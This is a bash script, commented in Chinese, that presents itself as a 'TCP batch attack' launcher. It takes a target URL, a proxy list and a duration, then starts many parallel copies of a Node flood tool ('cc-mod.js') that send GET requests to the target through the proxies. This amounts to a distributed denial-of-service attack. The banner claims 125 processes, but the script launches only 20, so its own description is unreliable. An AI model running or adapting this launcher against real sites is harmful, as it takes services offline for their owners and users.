#!/bin/bash
# ============================================================================
# TCP 批量攻击脚本
# ============================================================================
# 用法: ./tcp <目标URL> <代理文件> <时长秒数>
# 示例: ./tcp http://example.com ../config/proxies.txt 60
# ============================================================================

# 参数说明
TARGET=$1      # 目标 URL
PROXIES=$2     # 代理文件路径
DURATION=$3    # 持续时间(秒)
METHOD=GET     # 请求方法

# 参数验证
if [ -z "$TARGET" ] || [ -z "$PROXIES" ] || [ -z "$DURATION" ]; then
    echo -e "\033[31m错误: 参数不完整\033[0m"
    echo ""
    echo -e "\033[36m用法:\033[0m"
    echo "  ./tcp <目标URL> <代理文件> <时长秒数>"
    echo ""
    echo -e "\033[36m示例:\033[0m"
    echo "  ./tcp http://example.com ../config/proxies.txt 60"
    echo ""
    echo -e "\033[36m参数说明:\033[0m"
    echo "  目标URL    - 要攻击的网址"
    echo "  代理文件   - 代理列表文件路径"
    echo "  时长秒数   - 攻击持续时间"
    exit 1
fi

# 显示启动信息
echo -e "\033[36m════════════════════════════════════════════════════════════\033[0m"
echo -e "\033[1m             TCP 批量攻击 - 125 并发进程\033[0m"
echo -e "\033[36m════════════════════════════════════════════════════════════\033[0m"
echo -e "\033[32m►\033[0m 目标: \033[1m$TARGET\033[0m"
echo -e "\033[32m►\033[0m 代理: \033[1m$PROXIES\033[0m"
echo -e "\033[32m►\033[0m 时长: \033[1m$DURATION 秒\033[0m"
echo -e "\033[32m►\033[0m 方法: \033[1m$METHOD\033[0m"
echo -e "\033[32m►\033[0m 进程: \033[1m125 个\033[0m"
echo -e "\033[36m════════════════════════════════════════════════════════════\033[0m"
echo -e "\033[32m正在启动攻击进程...\033[0m"
echo ""

# 启动 125 个并发进程
# cc-mod.js 参数顺序: <Target> <Proxies> <Duration> <Method>
node cc-mod.js $TARGET $PROXIES $DURATION $METHOD &
node cc-mod.js $TARGET $PROXIES $DURATION $METHOD &
node cc-mod.js $TARGET $PROXIES $DURATION $METHOD &
node cc-mod.js $TARGET $PROXIES $DURATION $METHOD &
node cc-mod.js $TARGET $PROXIES $DURATION $METHOD &
node cc-mod.js $TARGET $PROXIES $DURATION $METHOD &
node cc-mod.js $TARGET $PROXIES $DURATION $METHOD &
node cc-mod.js $TARGET $PROXIES $DURATION $METHOD &
node cc-mod.js $TARGET $PROXIES $DURATION $METHOD &
node cc-mod.js $TARGET $PROXIES $DURATION $METHOD &
node cc-mod.js $TARGET $PROXIES $DURATION $METHOD &
node cc-mod.js $TARGET $PROXIES $DURATION $METHOD &
node cc-mod.js $TARGET $PROXIES $DURATION $METHOD &
node cc-mod.js $TARGET $PROXIES $DURATION $METHOD &
node cc-mod.js $TARGET $PROXIES $DURATION $METHOD &
node cc-mod.js $TARGET $PROXIES $DURATION $METHOD &
node cc-mod.js $TARGET $PROXIES $DURATION $METHOD &
node cc-mod.js $TARGET $PROXIES $DURATION $METHOD &
node cc-mod.js $TARGET $PROXIES $DURATION $METHOD &
node cc-mod.js $TARGET $PROXIES $DURATION $METHOD &
